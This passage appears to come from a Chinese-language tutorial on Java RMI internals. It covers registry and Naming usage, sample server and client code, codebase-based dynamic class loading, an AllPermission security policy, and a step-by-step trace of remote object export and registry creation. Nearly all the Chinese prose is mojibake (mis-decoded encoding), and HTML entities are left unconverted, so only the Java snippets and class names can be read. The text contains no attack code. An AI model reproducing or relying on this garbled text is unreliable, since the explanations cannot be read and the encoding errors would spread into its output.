ï¼ˆReferenceï¼‰ï¼Œå¹¶é€šè¿‡è¿™ä¸ªå·ç æ‰¾åˆ°è¿™ä¸ªäººï¼ˆRemote Objectï¼‰ã€‚\nè¿™ç§ç”µè¯æœ¬çš„æ€æƒ³ï¼Œç”±java.rmi.registry.Registryå’Œjava.rmi.Namingæ¥å®ç°ã€‚ç°åœ¨åˆ†åˆ«æ¥çœ‹ä¸€ä¸‹è¿™ä¸¤ä¸ªç±»çš„åˆ©ç”¨ã€‚\njava.rmi.Namingï¼šè¿™æ˜¯ä¸€ä¸ªfinalç±»ï¼Œæä¾›äº†åœ¨è¿œç¨‹å¯¹è±¡æ³¨å†Œè¡¨ï¼ˆRegistryï¼‰ä¸­å­˜å‚¨å’Œè·å–è¿œç¨‹å¯¹è±¡å¼•ç”¨çš„æ–¹æ³•ï¼Œè¿™ä¸ªç±»æä¾›çš„æ¯ä¸ªæ–¹æ³•éƒ½æœ‰ä¸€ä¸ª URL æ ¼å¼çš„å‚æ•°ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š//host:port/nameï¼š host è¡¨ç¤ºæ³¨å†Œè¡¨æ‰€åœ¨çš„ä¸»æœº portè¡¨ç¤ºæ³¨å†Œè¡¨æ¥æ”¶è°ƒç”¨çš„ç«¯å£å·ï¼Œé»˜è®¤ä¸º 1099 name è¡¨ç¤ºä¸€ä¸ªæ³¨å†Œ Remote Object çš„å¼•ç”¨çš„åç§°ï¼Œä¸èƒ½æ˜¯æ³¨å†Œè¡¨ä¸­çš„ä¸€äº›å…³é”®å­—ã€‚ Naming æä¾›äº†æŸ¥è¯¢ï¼ˆlookupï¼‰ã€ç»‘å®šï¼ˆbindï¼‰ã€é‡æ–°ç»‘å®šï¼ˆrebindï¼‰ã€è§£é™¤ç»‘å®šï¼ˆunbindï¼‰ã€listï¼ˆåˆ—è¡¨ï¼‰ç”¨æ¥å¯¹æ³¨å†Œè¡¨è¿›è¡Œæ“ä½œã€‚æ‰€ä»¥Namingç±»å°±æ˜¯ä¸€ä¸ªç”¨æ¥å¯¹æ³¨å†Œè¡¨è¿›è¡Œæ“ä½œçš„ç±»ã€‚è€Œè¿™äº›æ–¹æ³•çš„å…·ä½“å®ç°ï¼Œæ˜¯è°ƒç”¨LocateRegistry.getRegistryæ–¹æ³•è·å–äº†Registryæ¥å£çš„å®ç°ç±»ï¼Œå¹¶è°ƒç”¨ç›¸å…³æ–¹æ³•è¿›è¡Œå®ç°çš„ã€‚\njava.rmi.registry.Registryï¼šè¿™ä¸ªæ¥å£åœ¨RMIä¸‹æœ‰ä¸¤ä¸ªå®ç°ç±»ï¼Œåˆ†åˆ«æ˜¯RegistryImplå’ŒRegistryImpl_Stubã€‚åé¢å†çœ‹ã€‚ æˆ‘ä»¬é€šå¸¸ä½¿ç”¨LocateRegistry#createRegistry()æ–¹æ³•æ¥åˆ›å»ºæ³¨å†Œä¸­å¿ƒï¼Œç„¶åå°†å¾…è°ƒç”¨çš„ç±»è¿›è¡Œç»‘å®šï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package Rmi.Server; import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class RMIServer{ public static void main(String[] args){ try { //åˆ›å»ºæ³¨å†Œä¸­å¿ƒ LocateRegistry.createRegistry(1099); System.out.println(\u0026#34;Server start\u0026#34;); //ç»‘å®šè°ƒç”¨ç±» RemoteInterface remoteTest = new RemoteTest(); Naming.bind(\u0026#34;rmi://localhost:1099/Hello\u0026#34;,remoteTest); }catch(Exception e){ e.printStackTrace(); } } } å®¢æˆ·ç«¯è¿›è¡Œè°ƒç”¨ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package Rmi.Client; //éœ€è¦ä¸¤ç«¯ä½¿ç”¨çš„RemoteInterfaceæ¥å£æ–‡ä»¶æ˜¯åŒä¸€ä¸ªï¼Œæˆ–è€…æ‰“æˆjaråŒ…å†ä½¿ç”¨ã€‚ import Rmi.Server.RemoteInterface; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.util.Arrays; import java.rmi.Naming; public class RMIClient{ public static void main(String[] args) throws Exception { //è·å–æ³¨å†Œè¡¨å¯¹è±¡ Registry r = LocateRegistry.getRegistry(\u0026#34;localhost\u0026#34;,1099); System.out.println(Arrays.toString(r.list())); //å¯»æ‰¾å¯¹åº”RMIå®ä¾‹ RemoteInterface o = (RemoteInterface) Naming.lookup(\u0026#34;Hello\u0026#34;); //è°ƒç”¨è¿œç¨‹å¯¹è±¡çš„æ–¹æ³• System.out.println(o.sayHello()); System.out.println(o.sayName(new ClientObject())); } } å…ˆè¿è¡ŒRMIServerï¼š æˆåŠŸè¿è¡Œå¹¶ç»‘å®šã€‚å†è¿è¡Œå®¢æˆ·ç«¯RMIClientå»è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•ï¼š æˆåŠŸè°ƒç”¨ã€‚\néœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œ RemoteInterface æ¥å£åœ¨ Client/Server/Registry å‡åº”è¯¥å­˜åœ¨ï¼Œä¸€èˆ¬ Registry ä¸ Server åœ¨åŒä¸€ç«¯ä¸Šã€‚\nâ€”â€”â€”â€”â€”â€”\nå…¶ä»–ç‰¹æ€§è¯´æ˜ å‰é¢å°±æ˜¯ä¸€ä¸ªç®€å•çš„è¿œç¨‹è°ƒç”¨é€šä¿¡ã€‚è¿˜éœ€è¦çŸ¥é“RMIè¿˜å¯ä»¥ä½¿ç”¨åŠ¨æ€ç±»åŠ è½½å’Œå®‰å…¨ç®¡ç†å™¨æ¥å®‰å…¨ä¼ è¾“Javaç±»ã€‚\nåŠ¨æ€ç±»åŠ è½½ java.rmi.server.codebaseï¼šè¯¥å±æ€§è¡¨ç¤ºä¸€ä¸ªæˆ–å¤šä¸ªURLä½ç½®ï¼Œå¯ä»¥ä»ä¸­ä¸‹è½½æœ¬åœ°ï¼ˆCLASSPATHï¼‰æ‰¾ä¸åˆ°çš„ç±»ï¼Œç›¸å½“äºä¸€ä¸ªä»£ç åº“ã€‚\nå¦‚æœå®¢æˆ·ç«¯åœ¨è°ƒç”¨æ—¶ï¼Œä¼ é€’äº†ä¸€ä¸ªå¯åºåˆ—åŒ–å¯¹è±¡ï¼ˆæ¯”å¦‚å‰é¢ä¾‹å­ä¸­sayName()æ–¹æ³•æˆ‘ä¼ è¿›å»ä¸€ä¸ªç±»å®ä¾‹ï¼‰ï¼Œè¿™ä¸ªå¯¹è±¡åœ¨æœåŠ¡ç«¯ä¸å­˜åœ¨ï¼Œåˆ™åœ¨æœåŠ¡ç«¯ä¼šæŠ›å‡ºClassNotFound çš„å¼‚å¸¸ï¼Œä½†æ˜¯ RMI æ”¯æŒåŠ¨æ€ç±»åŠ è½½ï¼Œå¦‚æœè®¾ç½®äº†java.rmi.server.codebaseï¼Œåˆ™ä¼šå°è¯•ä»å…¶ä¸­çš„åœ°å€è·å–.classå¹¶åŠ è½½åŠååºåˆ—åŒ–ã€‚\nå®¢æˆ·ç«¯åŒæ ·ï¼Œå¦‚æœå¾—åˆ°ä¸€ä¸ªå®¢æˆ·ç«¯æ²¡æœ‰çš„classæ–‡ä»¶ï¼Œå°±ä¼šä»æœåŠ¡ç«¯æä¾›çš„java.rmi.server.codebaseURLå»åŠ è½½ç±»ã€‚\nå¯ä½¿ç”¨ System.setProperty(\u0026quot;java.rmi.server.codebase\u0026quot;, \u0026quot;http://127.0.0.1:9999/\u0026quot;); è¿›è¡Œè®¾ç½®ï¼Œæˆ–ä½¿ç”¨å¯åŠ¨å‚æ•° -Djava.rmi.server.codebase=\u0026quot;http://127.0.0.1:9999/\u0026quot; è¿›è¡ŒæŒ‡å®šã€‚\nå®‰å…¨è®¾ç½® æˆ‘ä»¬é€šè¿‡ç½‘ç»œåŠ è½½å¤–éƒ¨ç±»å¹¶æ‰§è¡Œæ–¹æ³•ï¼Œå¿…é¡»è¦æœ‰ä¸€ä¸ªå®‰å…¨ç®¡ç†å™¨æ¥è¿›è¡Œç®¡ç†ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®å®‰å…¨ç®¡ç†ï¼Œåˆ™RMIä¸ä¼šåŠ¨æ€åŠ è½½ä»»ä½•ç±»ï¼Œé€šå¸¸ä½¿ç”¨å¦‚ä¸‹ä»£ç ï¼š\n1 2 3 if (System.getSecurityManager() == null) { System.setSecurityManager(new RMISecurityManager()); } ç®¡ç†å™¨å’Œç®¡ç†ç­–ç•¥ç›¸è¾…ç›¸æˆï¼Œæ‰€ä»¥è¿˜éœ€è¦æä¾›ä¸€ä¸ªç­–ç•¥æ–‡ä»¶ï¼Œé‡Œé¢é…å€¼å…è®¸å“ªäº›ä¸»æœºè¿›è¡Œå“ªäº›æ“ä½œï¼Œå¦‚ä¸‹ä¾¿æ˜¯å…¨éƒ¨æƒé™ï¼š\n1 2 3 4 //rmi.policy grant { permission java.security.AllPermission; }; åŒæ ·å¯ä»¥ä½¿ç”¨ -Djava.security.policy=rmi.policy æˆ– System.setProperty(\u0026quot;java.security.policy\u0026quot;, RemoteServer.class.getClassLoader().getResource(\u0026quot;rmi.policy\u0026quot;).toString()); æ¥è¿›è¡Œè®¾ç½®ã€‚\næºç åˆ†æ å‰é¢å­¦ä¹ äº†å¤§æ¦‚çš„æµç¨‹ï¼Œç°åœ¨æ¥è·Ÿä¸€ä¸‹æºç çœ‹å…·ä½“å®ç°ã€‚\næœåŠ¡æ³¨å†Œ è¿œç¨‹å¯¹è±¡åˆ›å»º åœ¨å‰é¢æˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªè¿œç¨‹å¯¹è±¡ RemoteTestï¼Œç»§æ‰¿äº† UnicastRemoteObjectç±»ï¼Œè¿™ä¸ªç±»ä½¿ç”¨ JRMP åè®® export è¿œç¨‹å¯¹è±¡ï¼Œå¹¶è·å–ä¸è¿œç¨‹å¯¹è±¡è¿›è¡Œé€šä¿¡çš„ Stubã€‚å¹¶åœ¨æœåŠ¡ç«¯åˆ›å»ºè¿‡ç¨‹ä¸­å¯¹è¿™ä¸ªç±»è¿›è¡Œäº†åˆå§‹åŒ–ï¼Œå¯¹åº”ä¸‹ä»£ç ï¼š\n1 RemoteInterface remoteTest = new RemoteTest(); æ‰“æ–­ç‚¹è·Ÿä¸€ä¸‹è¿™é‡Œçš„æµç¨‹ï¼Œåœ¨RemoteTeståˆå§‹åŒ–æ—¶ï¼Œç”±äºè¿œç¨‹å¯¹è±¡ç»§æ‰¿äº†UnicastRemoteObjectç±»ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨è¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•ï¼š\nè¿™é‡Œçš„thiså°±æ˜¯æˆ‘ä»¬è¦æ³¨å†Œçš„è¿œç¨‹å¯¹è±¡ï¼ˆRemoteTestå¯¹è±¡ï¼‰ï¼Œç„¶åå°±ä¼šè°ƒç”¨UnicastRemoteObjectç±»çš„exportObject()æ–¹æ³•ï¼š ç„¶åå®ä¾‹åŒ–äº†UnicastServerRefç±»å¹¶ä¸”åˆè°ƒç”¨UnicastRemoteObjectç±»çš„ exportObjectæ–¹æ³•ã€‚\nå…ˆè·Ÿè¿›è¿™ä¸ªUnicastServerRefç±»çš„å®ä¾‹ï¼š è¿™é‡Œåˆå®ä¾‹åŒ–äº†ä¸€ä¸ªLiveRefç±»ï¼Œè¿™é‡Œçš„var1å³å‰é¢çš„port(å³0)ï¼Œå†è·Ÿè¿›LiveRefç±»çš„åˆå§‹åŒ–ï¼š\nåˆå®ä¾‹åŒ–äº†ä¸€ä¸ªobjIDç±»ï¼Œç»§ç»­è·Ÿè¿›ï¼š\nä¹Ÿå°±æ˜¯å¯¹objIDç±»çš„å¡«å……ã€‚å€¼åˆ†åˆ«ä¸ºï¼š\nå›åˆ°LiveRefç±»çš„æ„é€ æ–¹æ³•ï¼Œç„¶åå°±ä¼šè°ƒç”¨LiveRefç±»çš„æ„é€ æ–¹æ³•ï¼š ç„¶åå°±æ˜¯å¯¹LiveRefç±»çš„å¡«å……ï¼š\nåœ¨LiveRefç±»åˆå§‹åŒ–å®Œæ¯•åï¼Œå°±ä¼šè¿›è¡Œçˆ¶ç±»çš„åˆå§‹åŒ–ï¼š\nå†è·Ÿè¿›ä¸€ä¸‹çˆ¶ç±»çš„å®ä¾‹ï¼š ä¹Ÿå°±æ˜¯è¯´ç°åœ¨å°†UnicastRefç±»çš„refå˜é‡èµ‹å€¼ä¸ºäº†ä¸€ä¸ªLiveRefç±»çš„å®ä¾‹ã€‚æœ€åå›åˆ°UnicastServerRefç±»çš„æ„é€ æ–¹æ³•ï¼š\nä¹Ÿå°±æ˜¯å¯¹è¿™ä¸ªç±»çš„å¡«å……ï¼Œå¯¹è¿™äº›ç±»è¿›è¡Œäº†å®ä¾‹åŒ–ã€‚\nå†è·Ÿè¿›exportObject()æ–¹æ³• å‰é¢è·Ÿäº†UnicastServerRefç±»çš„åˆå§‹åŒ–ï¼Œå†æ¥çœ‹è¿™é‡Œçš„exportObject()æ–¹æ³•ï¼š\nè¿™é‡Œæ¯«æ— ç–‘é—®ä¼šè¿›å…¥ifè¯­å¥ï¼Œè¿™é‡Œçš„ifè¯­å¥ç®€å•æ¥è¯´å°±æ˜¯ä¼šç»™è¿™ä¸ªRemoteTestç±»çš„â€œrefâ€è®¾ç½®ä¸ºä¸€ä¸ªUnicastServerRefç±»å®ä¾‹ï¼Ÿï¼ˆè¯´æ˜¯ä½¿å¾—è¿œç¨‹å¯¹è±¡èƒ½å¤Ÿåœ¨ç½‘ç»œä¸Šè¢«æ­£å¸¸åœ°å®šä½å’Œè®¿é—®ï¼‰ã€‚\nç„¶åå°±ä¼šè°ƒç”¨sref(UnicastServerRefç±»å®ä¾‹)çš„exportObject()æ–¹æ³•ï¼š\nåœ¨è¿™é‡Œçœ‹åˆ°ä¸€ä¸ªcreateProxy()æ–¹æ³•ï¼Œå’ŒåŠ¨æ€ä»£ç†é‚£é‡Œæ„Ÿè§‰å¾ˆåƒï¼Œçœ‹ä¸€ä¸‹è¿™ä¸ªæ–¹æ³•çš„å‚æ•°ä¼ é€’ä¸æºä»£ç ã€‚\nåŒæ ·çš„å…ˆçœ‹ä¸€ä¸‹è¿™é‡Œçš„getClientRef()æ–¹æ³•ï¼š è¿”å›äº†ä¸€ä¸ªUnicastRefç±»å®ä¾‹ï¼Œå‰é¢æœ‰ç”¨åˆ°è¿™ä¸ªç±»ï¼ˆUnicastServerRefç±»åˆå§‹åŒ–æ—¶è°ƒç”¨çš„çˆ¶ç±»ï¼‰ï¼Œç»§ç»­è·Ÿè¿›ï¼š\nè¿˜æ˜¯å’Œå‰é¢çš„å·®ä¸å¤šï¼Œçœ‹äº†ä¸€ä¸‹å˜é‡ç±»å‹è¿™äº›ï¼Œè¿˜æ˜¯å°†LiveRefç±»å®ä¾‹èµ‹å€¼ç»™äº†è¿™ä¸ªå˜é‡ï¼ˆå¹¶ä¸”å¥½åƒä¹Ÿæ˜¯å·®ä¸å¤šçš„ï¼‰ï¼Œå…¶å®åœ¨å‰é¢è°ƒç”¨getClientRef()æ–¹æ³•æ—¶å°±è°ƒç”¨äº†this.refï¼Œä½†æ˜¯ç”±äºæœ¬ç±»UnicastServerRefæ²¡æœ‰è¿™ä¸ªå˜é‡ï¼Œå…¶å®æœ€ç»ˆä¼ è¿›å»çš„å°±æ˜¯æˆ‘ä»¬å‰é¢åˆå§‹åŒ–æ—¶èµ‹å€¼çš„çˆ¶ç±»UnicastRefçš„refå˜é‡ã€‚æ‰€ä»¥è¿™é‡Œçš„ç›®çš„åº”è¯¥å°±æ˜¯è·å–å¡«å……äº†çš„UnicastRefç±»å®ä¾‹ã€‚\nå†å›åˆ°åŸå…ˆçš„createProxy()æ–¹æ³•ï¼š ç„¶åå°±ä¼šè°ƒç”¨åˆ°sun.rmi.server.Utilç±»ä¸‹çš„createProxy()æ–¹æ³•ï¼š\nç®€å•è·Ÿäº†ä¸€ä¸‹è¿™ä¸ªæºç ä¸­çš„æ–¹æ³•ï¼š\ngetRemoteClass()ï¼šä¹Ÿå°±æ˜¯åˆ¤æ–­var0çš„æ¥å£æ˜¯å¦ç»§æ‰¿Remote.classï¼Œæ˜¯çš„è¯å°±è¿”å›è¿™ä¸ªvar0ï¼Œæ¯«æ— ç–‘é—®æˆ‘ä»¬çš„RemoteTestç±»æ¥å£æ˜¯ç»§æ‰¿äº†çš„ï¼Œæ‰€ä»¥è¿™é‡Œçš„var3å¯ä»¥çœ‹ä½œæ˜¯ç­‰ä»·äºvar0çš„ã€‚ ç„¶åç»§ç»­çœ‹ï¼Œåˆ°äº†ifæ¡ä»¶ï¼Œvar2å³ä¼ å‚è¿›æ¥çš„forceStubUseå˜é‡ï¼Œè€Œè¿™ä¸ªå˜é‡åœ¨æˆ‘ä»¬æœ€å¼€å§‹å¯¹UnicastServerRefç±»è¿›è¡Œåˆå§‹åŒ–çš„æ—¶å€™å°±å·²ç»èµ‹å€¼ä¸ºfalseäº†ï¼š\nç„¶åignoreStubClassesé»˜è®¤ä¸ºfalseï¼Œåœ¨javaä¸­ \u0026amp;\u0026amp; è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§æ¯” || çš„é«˜ï¼Œç°åœ¨å·²çŸ¥var2ä¸ºfalseï¼Œ!ignoreStubClassesä¸ºtrueï¼Œç°åœ¨é‡ç‚¹çœ‹è¿™ä¸ªstubClassExists()æ–¹æ³•ï¼š\nç®€å•æ¥è¯´å°±æ˜¯åˆ¤æ–­ withoutStubs å˜é‡æ˜¯å¦å­˜åœ¨var0è¿™ä¸ªkeyï¼Œä¸å­˜åœ¨çš„è¯å°±ä¼šè°ƒç”¨forName()æ–¹æ³•å»æ‰¾xxx_Stub è¿™ä¸ªç±»ï¼Œæ‰¾åˆ°äº†å°±è¿”å›trueã€‚å¾ˆæ­£å¸¸ä¼šè¿›å…¥åˆ°è¿™ä¸ªifè¯­å¥ï¼Œä½†åŒæ ·çš„ä¸å­˜åœ¨RemoteTest_Stubè¿™ä¸ªç±»ä¼šè¿›å…¥åˆ°catchè¯­å¥ï¼š\næœ€åstubClassExists()æ–¹æ³•è¿”å›äº†falseã€‚\nâ€”â€”â€”â€”â€”â€”\næœ€åå¹¶ä¸ä¼šè¿›å…¥ifæ¡ä»¶ï¼š\nçœ‹æºç ï¼Œç®€å•è·Ÿæ–¹æ³•ï¼Œå¤§æ¦‚å¦‚ä¸‹ï¼š\ngetRemoteInterfaces()ï¼šç®€å•æ¥è¯´å°±æ˜¯è·å–å®ç°äº†Remote.classæ¥å£åŠRemote.classæ¥å£ã€‚åœ¨è¿™é‡Œè·å–åˆ°çš„ä¹Ÿå°±æ˜¯Remote.classå’ŒRemoteInterface.class. åé¢çš„ä¹Ÿå°±å’ŒåŠ¨æ€ä»£ç†å¤§å·®ä¸å·®äº†ã€‚ä»£ç†ç±»ä¸ºRemoteObjectInvocationHandlerç±»ï¼Œå§”æ‰˜ç±»æ˜¯UnicastRefç±»å®ä¾‹ã€‚\næ‰€ä»¥æœ€åå°±æ˜¯è¿”å›äº†ä¸€ä¸ªRemoteç±»å‹çš„RemoteObjectInvocationHandlerä»£ç†å¯¹è±¡ã€‚\næ‰€ä»¥è¯´åªè¦å¯¹è¿™ä¸ªä»£ç†å¯¹è±¡è°ƒç”¨æ–¹æ³•å°±ä¼šåˆ°RemoteObjectInvoactionHandlerç±»çš„invoke()æ–¹æ³•ã€‚\nå›åˆ°UnicastServerRefç±»çš„export()æ–¹æ³•ï¼Œå‰é¢è¿”å›äº†ä¸€ä¸ªRemoteç±»å‹çš„ä»£ç†å¯¹è±¡ï¼Œåé¢åˆå®ä¾‹åŒ–äº†ä¸€ä¸ªTargetç±»ï¼š\nç®€å•çœ‹ä¸€ä¸‹è¿™é‡Œçš„Targetç±»åˆå§‹åŒ–æ—¶ä¼ è¿›å»çš„å‚æ•°ï¼š\nvar1ï¼šå³RemoteTestç±»å®ä¾‹\nthisï¼šä¹Ÿå°±æ˜¯UnicastServerRefç±»å®ä¾‹ã€‚\nvar5ï¼šå³å‰é¢çš„ä»£ç†å¯¹è±¡\nthis.ref.getObjID()ï¼š\nå°±æ˜¯è¿”å›æˆ‘ä»¬å‰é¢å®ä¾‹åŒ–LiveRefç±»æ—¶çš„idã€‚\nvar3ï¼šå³æœ€å¼€å§‹ä¼ å…¥export()æ–¹æ³•çš„false ç®€å•çœ‹çœ‹èµ‹å€¼æƒ…å†µï¼š\nè¿™é‡Œçš„Targetå¯¹è±¡ä¹Ÿå°±æ˜¯å°è£…äº†æˆ‘ä»¬çš„è¿œç¨‹å¯¹è±¡å’Œç”Ÿæˆçš„åŠ¨æ€ä»£ç†ç±»ã€‚\nç„¶åè°ƒç”¨äº†LiveRefç±»çš„exportObject()æ–¹æ³•ï¼Œä¼ è¿›å»äº†åˆšå®ä¾‹åŒ–å®Œçš„Targetå¯¹è±¡ï¼š å³ï¼š\nè¿™é‡Œçš„epä¹Ÿå°±æ˜¯å‰é¢åˆ†æçš„LiveRefå®ä¾‹æ˜¯æœ‰è¿‡èµ‹å€¼çš„å˜é‡ã€‚\næ‰€ä»¥ç°åœ¨åˆä¼šè°ƒç”¨TCPEndpointç±»çš„exportObject()æ–¹æ³•ï¼š\nç„¶åå°±ä¼šè°ƒç”¨åˆ°TCPTransportç±»çš„exportObject()æ–¹æ³•ï¼š\nè¿™é‡Œçš„listen()æ–¹æ³•å°±æ˜¯ä¸ºæœ¬åœ°çš„stub(ä»£ç†ç±»)å¼€å¯ä¸€ä¸ªéšæœºç«¯å£ï¼Œç„¶åæœ¬åœ°ç›‘å¬è¿™ä¸ªç«¯å£ã€‚\nç„¶åè°ƒç”¨äº†çˆ¶ç±»çš„export()æ–¹æ³•ï¼Œä¼ è¿›å»äº†Targetç±»å®ä¾‹ï¼Œè·Ÿè¿›ä¸€ä¸‹ï¼š\nè¿™é‡Œä¸»è¦å°±æ˜¯å°†Targetå¯¹è±¡å­˜æ”¾è¿›ObjectTableç±»ä¸­ï¼ŒObjectTableç”¨æ¥ç®¡ç†æ‰€æœ‰å‘å¸ƒçš„æœåŠ¡å®ä¾‹Targetï¼Œç®€å•çœ‹ä¸€ä¸‹è¿™é‡Œçš„putTarget()æ–¹æ³•ï¼š\nè¿™é‡Œå°±æ˜¯æ”¾è¿›äº†é”®å€¼å¯¹ï¼Œåœ¨è¿™ä¸ªç±»ä¸­çš„è¿™ä¸¤ä¸ªobjTableå’ŒimplTableå˜é‡éƒ½æ˜¯HashMapç±»å®ä¾‹ã€‚è¿™é‡Œå¯ä»¥çœ‹åˆ°æ˜¯å‘é‡Œé¢putè¿›å€¼äº†çš„ï¼Œç°åœ¨æ¥çœ‹ä¸€ä¸‹å€¼çš„æƒ…å†µï¼š\nvalueæœ‰ä¸‰ä¸ªï¼Œåˆ†åˆ«æ˜¯ï¼š\næˆ‘ä»¬å‰é¢åˆ†æå‡ºæ¥çš„ä»£ç†ç±»ï¼š åé¢æ³¨å†Œä¸­å¿ƒåˆ›å»ºåˆ†æå‡ºæ¥çš„RegistryImpl_Stubç±»ï¼š DGCImpl_Stubç±»ï¼Œå¥½åƒæ˜¯ä¸åƒåœ¾å›æ”¶ç›¸å…³çš„ï¼Œé»˜è®¤åˆ›å»ºï¼š è¿™é‡Œæœ€å¼€å§‹å­¦çš„æ—¶å€™æ˜¯è¸©äº†ä¸€ä¸‹å‘çš„ï¼Œæˆ‘æ˜¯ç›´æ¥ç”¨çš„æµç¨‹å­¦ä¹ çš„ä»£ç æ¥åˆ†æçš„ï¼Œæ³¨å†Œä¸­å¿ƒåˆ›å»ºçš„æµç¨‹ä¹Ÿæ˜¯ä¼šè°ƒç”¨åˆ°UnicastServerRefç±»çš„exportObject()æ–¹æ³•çš„ï¼Œæ‰€ä»¥å…¶å®ä¹Ÿä¼šè¿›è¡Œä¸€æ¬¡è¿™é‡Œçš„putæ“ä½œï¼Œä¸ªäººè°ƒè¯•æ—¶æ­»æ´»ä¸èƒ½è¿›å…¥super.exportObject()æ–¹æ³•ï¼Œç›´æ¥æ‰“æ–­ç‚¹ä¼šæ–­åœ¨æ³¨å†Œä¸­å¿ƒè°ƒç”¨çš„super.exportObject()æ–¹æ³•ä¸­ï¼Œé‚£é‡Œå°±åªä¼šæœ‰ä¸¤ä¸ªï¼Œå¹¶ä¸”çœ‹ä¸å‡ºæ¥æœ‰ä»£ç†å¯¹è±¡ï¼Œæ‰€ä»¥å…¶å®è¿™é‡Œçš„å­¦ä¹ è°ƒç”¨å¯ä»¥ç›´æ¥ç”¨å¦‚ä¸‹ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package Rmi.Server; import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class RMIServer{ public static void main(String[] args){ try { //ç»‘å®šè°ƒç”¨ç±» RemoteInterface remoteTest = new RemoteTest(); Naming.bind(\u0026#34;rmi://localhost:1099/Hello\u0026#34;,remoteTest); }catch(Exception e){ e.printStackTrace(); } } } ä¸è¦æ³¨å†Œä¸­å¿ƒæ¥è°ƒè¯•ã€‚\nï¼ˆé¢˜å¤–è¯ç»“æŸï¼‰\nâ€”â€”â€”â€”â€”â€”â€”â€”\næœ€åå›åˆ°UnicastServerRefç±»çš„exportObject()æ–¹æ³•ï¼Œæœ€ç»ˆæ˜¯è¿”å›äº†ä»£ç†å¯¹è±¡çš„ï¼š\nå¤§æ¦‚è¿œç¨‹åˆ›å»ºå¯¹è±¡çš„è¿‡ç¨‹å°±æ˜¯è¿™æ ·ï¼Œæ³¨æ„è¿™é‡Œæ˜¯å°†è¿œç¨‹å¯¹è±¡å’Œä»£ç†å¯¹è±¡éƒ½æ”¾è¿›äº†ä¸€ä¸ªTargetç±»å®ä¾‹ï¼Œå¹¶ä¸”è¿™é‡Œä»£ç†å¯¹è±¡çš„å§”æ‰˜ç±»æ˜¯UnicastRefç±»ã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\næ³¨å†Œä¸­å¿ƒåˆ›å»º å¯¹åº”å¦‚ä¸‹ä»£ç ï¼š\n1 LocateRegistry.createRegistry(1099); åŒæ ·çš„åŠ æ–­ç‚¹è·Ÿä¸€ä¸‹è¿‡ç¨‹ï¼š\nå®ä¾‹åŒ–äº†ä¸€ä¸ªRegistryImplç±»å®ä¾‹ï¼Œä¼ è¿›å»äº†portä¸º1099ï¼Œè·Ÿè¿›ä¸€ä¸‹è¿™é‡Œçš„æ„é€ æ–¹æ³•ï¼š\nç¨å¾®æ³¨æ„ä¸€ä¸‹è¿™é‡Œçš„bindingså˜é‡è¢«èµ‹å€¼ä¸ºäº†Hashtableç±»ã€‚\nç„¶åä¼šè¿›å…¥elseè¯­å¥ï¼š\næ³¨æ„çœ‹è¿™é‡Œçš„LiveRefç±»å®ä¾‹è¯­å¥ï¼Œä¼ è¿›å»äº†ä¸€ä¸ªidå’Œæˆ‘ä»¬ä¼ è¿›å»çš„portï¼ˆ1099ï¼‰ï¼Œçœ‹ä¸€ä¸‹è¿™é‡Œçš„idå˜é‡çš„å®šä¹‰ï¼š\nè¿™é‡Œå’Œå‰é¢è¿œç¨‹å¯¹è±¡åˆ›å»ºçš„åˆ†æéƒ¨åˆ†è¿˜æ˜¯æœ‰ç‚¹åƒçš„ã€‚æ‰€ä»¥è¿™é‡Œæ˜¯ä¼ å…¥äº†ObjIDç±»å®ä¾‹å’Œportï¼ˆ1099ï¼‰ï¼Œå¯¹LiveRefç±»çš„å˜é‡è¿›è¡Œäº†èµ‹å€¼ï¼š\nç„¶åå°±ä¼šè°ƒç”¨setup()æ–¹æ³•ï¼š å…ˆè·ŸUnicastServerRefç±»çš„åˆå§‹åŒ–ï¼š æ‰€ä»¥è¿™é‡Œè¿˜æ˜¯å°†UnicastServerRefç±»çš„çˆ¶ç±»UnicastRefçš„refå˜é‡èµ‹å€¼ä¸ºäº†ä¸€ä¸ªLiveRefç±»å®ä¾‹ï¼š\nå†è·Ÿè°ƒç”¨çš„setup()æ–¹æ³•ï¼Œä¼ è¿›å»äº†åˆšåˆå§‹åŒ–å®Œçš„UnicastServerRefç±»å®ä¾‹ï¼š è·Ÿäº†ä¸€ä¸‹ï¼Œè¿™é‡Œåº”è¯¥æ˜¯å°†RegistryImplç±»çš„çˆ¶ç±»RemoteServerçš„çˆ¶ç±»RemoteObjectçš„refå˜é‡èµ‹å€¼ä¸ºäº†ä¼ è¿›æ¥çš„UnicastServerRefç±»å®ä¾‹ï¼ˆä¸ç¡®å®šï¼Œå…ˆçœ‹åé¢ï¼‰ã€‚\nç„¶ååˆè°ƒç”¨äº†UnicastServerRefç±»çš„exportObject()æ–¹æ³•ï¼Œåªä¸è¿‡è¿™é‡Œä¼ å…¥çš„æ˜¯RegistryImplç±»å®ä¾‹ï¼š\nåˆåˆ°äº†å‰é¢åˆ†æè¿‡çš„exportObject()æ–¹æ³•ã€‚\nè·Ÿè¿›è¿™é‡Œçš„Util.createProxy()æ–¹æ³•ï¼š\nå…³é”®è¿˜æ˜¯è¿™ä¸ªstubClassExists()æ–¹æ³•ï¼š è¿™é‡Œæ‰¾åˆ°äº†RegistryImpl_Stubè¿™ä¸ªClasså¯¹è±¡ï¼Ÿæ‰€ä»¥å¯ä»¥è¿”å›trueã€‚\næ‰€ä»¥ä¼šè¿›å…¥ifè¯­å¥ï¼Œè€Œä¸æ˜¯ä¸Šä¸€æ¬¡åˆ†æçš„è¿›å…¥elseè¯­å¥ï¼š\nè¿™é‡Œåˆè°ƒç”¨äº†createStub()æ–¹æ³•ï¼Œåˆ†åˆ«ä¼ å…¥äº†RegistryImplç±»çš„classå¯¹è±¡å’Œå‚æ•°ä¼ 